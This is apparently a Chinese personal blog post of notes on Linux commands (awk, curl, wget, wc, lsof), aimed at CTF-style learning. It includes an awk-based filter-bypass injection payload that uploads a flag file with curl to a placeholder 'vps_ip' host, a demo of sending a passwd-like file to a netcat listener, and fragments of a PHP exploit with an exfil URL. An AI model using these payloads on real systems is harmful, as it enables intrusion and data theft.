<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="p1k">
    
    <title>
        
            一些常见的Linux命令 |
        
        p1k&#39;s blog
    </title>
    <link rel="shortcut icon" href="/images/logo.svg">
    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/css/font-awesome.min.css">

    <script id="hexo-configurations">
    let KEEP = window.KEEP || {};
    KEEP.hexo_config = {"hostname":"p1keman.github.io","root":"/","language":"zh-cn"};
    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.svg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Today's matter, today's end."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.3.1"};
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"};
  </script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">

    <div class="header-content">
        <div class="left">
            <a class="logo-title" href="/">
                p1k&#39;s blog
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/links"
                            >
                                友链
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                </ul>
            </div>
            <div class="mobile">
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/links">友链</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content normal-code-theme">

                
                    <div class="fade-in-down-animation">
    <div class="article-content-container">

        <div class="article-title">
            <span class="title-hover-animation">一些常见的Linux命令</span>
        </div>

        
            <div class="article-header">
                <div class="avatar">
                    <img src="/images/avatar.svg">
                </div>
                <div class="info">
                    <div class="author">
                        <span class="name">p1k</span>
                        <span class="level">Lv6</span>
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fas fa-edit"></i> 2020-02-29 11:09:37
    </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fas fa-tags"></i>
            <ul>
                
                    <li>
                        <a href="/tags/Linux/">Linux</a>
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        <div class="article-content markdown-body">
            <p>学习一下Linux的一些常见命令</p>
<a id="more"></a>

<h1 id="linux三剑客"><a href="#linux三剑客" class="headerlink" title="linux三剑客"></a>linux三剑客</h1><h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#39;BEGIN&#123; print &quot;start&quot; &#125; pattern&#123; commands &#125; END&#123; print &quot;end&quot; &#125;&#39; file</span><br></pre></td></tr></table></figure>
<p>BEGIN pattern END这三部分都可以省略</p>
<ul>
<li>第一步：执行<code>BEGIN&#123; commands &#125;</code>语句块中的语句；</li>
<li>第二步：从文件或标准输入(stdin)读取一行，然后执行<code>pattern&#123; commands &#125;</code>语句块，它逐行扫描文件，从第一行到最后一行重复这个过程，直到文件全部被读取完毕。</li>
<li>第三步：当读至输入流末尾时，执行<code>END&#123; commands &#125;</code>语句块。</li>
</ul>
<p><strong>BEGIN语句块</strong>在awk开始从输入流中读取行<strong>之前</strong>被执行，这是一个可选的语句块，比如变量初始化、打印输出表格的表头等语句通常可以写在BEGIN语句块中。</p>
<p><strong>END语句块</strong>在awk从输入流中读取完所有的行<strong>之后</strong>即被执行，比如打印所有行的分析结果这类信息汇总都是在END语句块中完成，它也是一个可选语句块。</p>
<p><strong>pattern语句块</strong>中的通用命令是最重要的部分，它也是可选的。如果没有提供pattern语句块，则默认执行<code>&#123; print &#125;</code>，即打印每一个读取到的行，awk读取的每一行都会执行该语句块。</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>awk ‘{print $0}’ test.txt  awk会读取test.txt的每一行， print是打印 </p>
<p>$0代表当前行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span> test.txt</span><br><span class="line">this is one line;</span><br><span class="line">this is two line;</span><br></pre></td></tr></table></figure>
<p>也可以不使用文件名 利用管道符|</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ <span class="built_in">echo</span> <span class="string">&quot;this is one line;this is two line;&quot;</span>| awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span></span><br><span class="line">this is one line;this is two line;</span><br></pre></td></tr></table></figure>


<h3 id="分割域"><a href="#分割域" class="headerlink" title="分割域"></a>分割域</h3><p>$0代表一行 每行内还要再继续分割 分割符一般为空格 tab键  用第一个域代表分割以后的第一个字符，$0代表整个域，$1代表第一个域  $n代表第N个域</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ <span class="built_in">echo</span> <span class="string">&quot;this is one line;this is two line;&quot;</span>| awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">this</span><br><span class="line">p1k@ddd:~$ <span class="built_in">echo</span> <span class="string">&quot;this is one line;this is two line;&quot;</span>| awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span></span><br><span class="line">is</span><br></pre></td></tr></table></figure>


<h3 id="分割符"><a href="#分割符" class="headerlink" title="分割符"></a>分割符</h3><p>指定分割符-F</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ cat demo.txt | grep <span class="string">&#x27;user&#x27;</span></span><br><span class="line">cups-pk-helper:x:110:116:user <span class="keyword">for</span> cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin</span><br><span class="line">hplip:x:118:7:HPLIP system user,,,:/var/run/hplip:/bin/<span class="literal">false</span></span><br><span class="line">p1k@ddd:~$ awk -F <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;/user/ &#123;print $1&#125;&#x27;</span> demo.txt</span><br><span class="line">cups-pk-helper</span><br><span class="line">hplip</span><br></pre></td></tr></table></figure>
<p>这里print前面是一个正则表达式 匹配含有user的</p>
<h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><p>awk编码绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ sky&#x3D;&#96;awk &#39;BEGIN&#123;printf &quot;%c\n&quot;,97&#125;&#39;&#96; &amp;&amp; echo $sky</span><br><span class="line">a</span><br></pre></td></tr></table></figure>
<p>构造空格，并向外发送数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(sky&#x3D;&#96;awk &#39;BEGIN&#123;printf &quot;%c\n&quot;,47&#125;&#39;&#96;&amp;&amp;curl vps_ip:23333 -T &#96;cat .$&#123;sky&#125;flag$&#123;sky&#125;flag.jpg&#96;)</span><br></pre></td></tr></table></figure>


<h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><h4 id="post请求"><a href="#post请求" class="headerlink" title="post请求"></a>post请求</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -d &quot;user&#x3D;admin&amp;passwd&#x3D;12345678&quot; http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;login</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl url -T filename</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试</p>
<p>发送</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ curl 192.168.25.1:9999 -T demo.txt </span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  2593    0     0  100  2593      0    136  0:00:19  0:00:19 --:--:--</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>监听端口 就能收到文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\netcat&gt;nc <span class="literal">-lvp</span> <span class="number">9999</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9999</span> ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">25.141</span>: inverse host lookup failed: h_errno <span class="number">11004</span>: NO_DATA</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.25.1</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.25.141</span>] <span class="number">45804</span>: NO_DATA</span><br><span class="line">PUT /demo.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">192.168</span>.<span class="number">25.1</span>:<span class="number">9999</span></span><br><span class="line">User<span class="literal">-Agent</span>: <span class="built_in">curl</span>/<span class="number">7.58</span>.<span class="number">0</span></span><br><span class="line">Accept: */*</span><br><span class="line">Content<span class="literal">-Length</span>: <span class="number">2593</span></span><br><span class="line">Expect: <span class="number">100</span><span class="literal">-continue</span></span><br><span class="line"></span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p>-O/-o</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ curl -O http://192.168.25.1/exp.txt</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  4256  100  4256    0     0  4156k      0 --:--:-- --:--:-- --:--:-- 4156k</span><br><span class="line">p1k@ddd:~$ ls</span><br><span class="line">1.jpg  core      doc         exp.txt   snap               test.txt  模板  图片  下载  桌面</span><br><span class="line">36c3   demo.txt  dockerfile  mima.tar  stegdetect-master  公共的    视频  文档  音乐</span><br><span class="line">p1k@ddd:~$ cat exp.txt </span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://49.234.73.47:25341/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>-o可以重命名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ curl -o 1.php http://192.168.25.1/exp.txt</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  4256  100  4256    0     0  4156k      0 --:--:-- --:--:-- --:--:-- 4156k</span><br><span class="line">p1k@ddd:~$ ls</span><br><span class="line">1.jpg  36c3  demo.txt  dockerfile  mima.tar  stegdetect-master  公共的  视频  文档  音乐</span><br><span class="line">1.php  core  doc       exp.txt     snap      test.txt           模板    图片  下载  桌面</span><br><span class="line">p1k@ddd:~$ cat 1.</span><br><span class="line">1.jpg  1.php  </span><br><span class="line">p1k@ddd:~$ cat 1.php </span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://49.234.73.47:25341/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="伪造referer"><a href="#伪造referer" class="headerlink" title="伪造referer"></a>伪造referer</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -e &quot;www.linux.com&quot; http:&#x2F;&#x2F;mail.linux.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="修改user-agent"><a href="#修改user-agent" class="headerlink" title="修改user-agent"></a>修改user-agent</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -A &quot;Mozilla&#x2F;4.0 (compatible; MSIE 8.0; Windows NT 5.0)&quot; http:&#x2F;&#x2F;www.linux.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="指定cookie"><a href="#指定cookie" class="headerlink" title="指定cookie"></a>指定cookie</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;man.linuxde.net --cookie &quot;user&#x3D;root;pass&#x3D;123456&quot;</span><br><span class="line">curl -b cookiec.txt http:&#x2F;&#x2F;www.linux.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="保存http的响应头信息"><a href="#保存http的响应头信息" class="headerlink" title="保存http的响应头信息"></a>保存http的响应头信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -D cookied.txt http:&#x2F;&#x2F;www.linux.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="通过ftp下载"><a href="#通过ftp下载" class="headerlink" title="通过ftp下载"></a>通过ftp下载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># curl -O -u 用户名:密码 ftp:&#x2F;&#x2F;www.linux.com&#x2F;dodo1.JPG</span><br><span class="line"># curl -O ftp:&#x2F;&#x2F;用户名:密码@www.linux.com&#x2F;dodo1.JPG</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h2><h4 id="下载单个文件"><a href="#下载单个文件" class="headerlink" title="下载单个文件"></a>下载单个文件</h4><p>和curl差不多 主要用来下载文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -O filename url</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">p1k@ddd:~$ wget -O test.log 192.168.25.1/exp.txt</span><br><span class="line">--2020-02-03 13:58:40--  http://192.168.25.1/exp.txt</span><br><span class="line">正在连接 192.168.25.1:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度： 4256 (4.2K) [text/plain]</span><br><span class="line">正在保存至: “test.log”</span><br><span class="line"></span><br><span class="line">test.log                                           100%[================================================================================================================&gt;]   4.16K  --.-KB/s    用时 0s    </span><br><span class="line"></span><br><span class="line">2020-02-03 13:58:40 (458 MB/s) - 已保存 “test.log” [4256/4256])</span><br><span class="line"></span><br><span class="line">p1k@ddd:~$ ls</span><br><span class="line">1.jpg  1.php  36c3  cookied.txt  core  demo.txt  doc  dockerfile  exp.txt  mima.tar  snap  stegdetect-master  test.log  test.txt  公共的  模板  视频  图片  文档  下载  音乐  桌面</span><br><span class="line">p1k@ddd:~$ cat test.log </span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://49.234.73.47:25341/&#x27;</span>;</span><br><span class="line"><span class="variable">$exploit</span> = <span class="string">&#x27;http://149/exp.php&#x27;</span>;     // <span class="built_in">where</span> this file is hosted</span><br><span class="line"><span class="variable">$exfil</span> = <span class="string">&#x27;http://yourserver:1337/FLAG=&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以把下载文件 存到日志文件内</p>
<p>根据我的测试 没有办法把文件存到一个已有的文件内，如果文件名已经存在会直接覆盖</p>
<h4 id="下载多个文件"><a href="#下载多个文件" class="headerlink" title="下载多个文件"></a>下载多个文件</h4><p>把Url存到一个文件内，用-i参数 就可以下载文件url指向的资源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -i filelist.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>服务端我用了python的http.sever模块 避免了php文件被解析</p>
<p>服务端</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python <span class="literal">-m</span> http.server <span class="number">9000</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">9000</span> (http://<span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">9000</span>/) ...</span><br><span class="line"><span class="number">192.168</span>.<span class="number">25.141</span> - - [<span class="number">03</span>/<span class="type">Feb</span>/<span class="number">2020</span> <span class="number">14</span>:<span class="number">08</span>:<span class="number">05</span>] <span class="string">&quot;GET /exp.txt HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"><span class="number">192.168</span>.<span class="number">25.141</span> - - [<span class="number">03</span>/<span class="type">Feb</span>/<span class="number">2020</span> <span class="number">14</span>:<span class="number">08</span>:<span class="number">05</span>] <span class="string">&quot;GET /data.php HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>url.txt</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.25.1:9000&#x2F;exp.txt</span><br><span class="line">http:&#x2F;&#x2F;192.168.25.1:9000&#x2F;data.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -i url.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>








<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>选项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-c 统计字节数。</span><br><span class="line"></span><br><span class="line">-l 统计行数。</span><br><span class="line"></span><br><span class="line">-m 统计字符数。这个标志不能与 -c 标志一起使用。</span><br><span class="line"></span><br><span class="line">-w 统计字数。一个字被定义为由空白、跳格或换行字符分隔的字符串。</span><br><span class="line"></span><br><span class="line">-L 打印最长行的长度。</span><br><span class="line"></span><br><span class="line">-help 显示帮助信息</span><br><span class="line"></span><br><span class="line">--version 显示版本信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>统计字符个数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_11_centos ~]# echo &quot;123456&quot; | wc</span><br><span class="line">      1       1       7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​        行数      单词数     字节数     [文件名]</p>
<p>不知道咋回事字节数 总是多一个</p>
<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="lastb"><a href="#lastb" class="headerlink" title="lastb"></a>lastb</h2><h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><p>格式  </p>
<p>lsof [参数] [文件]</p>
<p>列出当前系统打开的文件</p>
<p>在centos下需要安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install lsof</span><br></pre></td></tr></table></figure>
<p>命令参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">-a 列出打开文件存在的进程</span><br><span class="line"></span><br><span class="line">-c&lt;进程名&gt; 列出指定进程所打开的文件</span><br><span class="line"></span><br><span class="line">-g  列出GID号进程详情</span><br><span class="line"></span><br><span class="line">-d&lt;文件号&gt; 列出占用该文件号的进程</span><br><span class="line"></span><br><span class="line">+d&lt;目录&gt;  列出目录下被打开的文件</span><br><span class="line"></span><br><span class="line">+D&lt;目录&gt;  递归列出目录下被打开的文件</span><br><span class="line"></span><br><span class="line">-n&lt;目录&gt;  列出使用NFS的文件</span><br><span class="line"></span><br><span class="line">-i&lt;条件&gt;  列出符合条件的进程。（4、6、协议、:端口、 @ip ）</span><br><span class="line"></span><br><span class="line">-p&lt;进程号&gt; 列出指定进程号所打开的文件</span><br><span class="line"></span><br><span class="line">-u  列出UID号进程详情</span><br><span class="line"></span><br><span class="line">-h 显示帮助信息</span><br><span class="line"></span><br><span class="line">-v 显示版本信息</span><br></pre></td></tr></table></figure>


<p>输出的各列信息含义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">COMMAND：进程的名称</span><br><span class="line"></span><br><span class="line">PID：进程标识符</span><br><span class="line"></span><br><span class="line">PPID：父进程标识符（需要指定-R参数）</span><br><span class="line"></span><br><span class="line">USER：进程所有者</span><br><span class="line"></span><br><span class="line">PGID：进程所属组</span><br><span class="line"></span><br><span class="line">FD：文件描述符，应用程序通过文件描述符识别该文件。如cwd、txt等</span><br></pre></td></tr></table></figure>


<p>查看谁正在使用指定文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lsof /bin/bash</span></span><br><span class="line">COMMAND   PID USER  FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">bash    24765 root txt    REG  253,1   964600 264297 /usr/bin/bash</span><br></pre></td></tr></table></figure>


<p>递归查看某个目录的相关文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#lsof +D /etc</span></span><br><span class="line">COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">systemd-u 437 root  mem    REG  253,1  8201136 786753 /etc/udev/hwdb.bin</span><br><span class="line">systemd-u 437 root    6r   REG  253,1  8201136 786753 /etc/udev/hwdb.bin</span><br></pre></td></tr></table></figure>


<p>列出某个用户打开的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># lsof -u root</span><br><span class="line">COMMAND     PID USER   FD      TYPE             DEVICE  SIZE&#x2F;OFF       NODE NAME</span><br><span class="line">systemd       1 root  cwd       DIR              253,1      4096          2 &#x2F;</span><br><span class="line">systemd       1 root  rtd       DIR              253,1      4096          2 &#x2F;</span><br><span class="line">systemd       1 root  txt       REG              253,1   1624448     267618 &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;systemd</span><br></pre></td></tr></table></figure>


<p>列出某个进程打开的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -c mysql</span><br></pre></td></tr></table></figure>


<p>列出某个用户的某个进程打开的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -u root -c mysql</span><br></pre></td></tr></table></figure>


<p>通过某个进程号显示该进程打开的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p 1</span><br></pre></td></tr></table></figure>


<p>列出所有的网络连接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#lsof -i</span></span><br><span class="line">COMMAND     PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">chronyd     626 chrony    5u  IPv4  12686      0t0  UDP localhost:323 </span><br><span class="line">chronyd     626 chrony    6u  IPv6  12687      0t0  UDP localhost:323 </span><br><span class="line">dhclient    794   root    6u  IPv4  13723      0t0  UDP *:bootpc</span><br></pre></td></tr></table></figure>


<p>列出所有tcp网络信息</p>
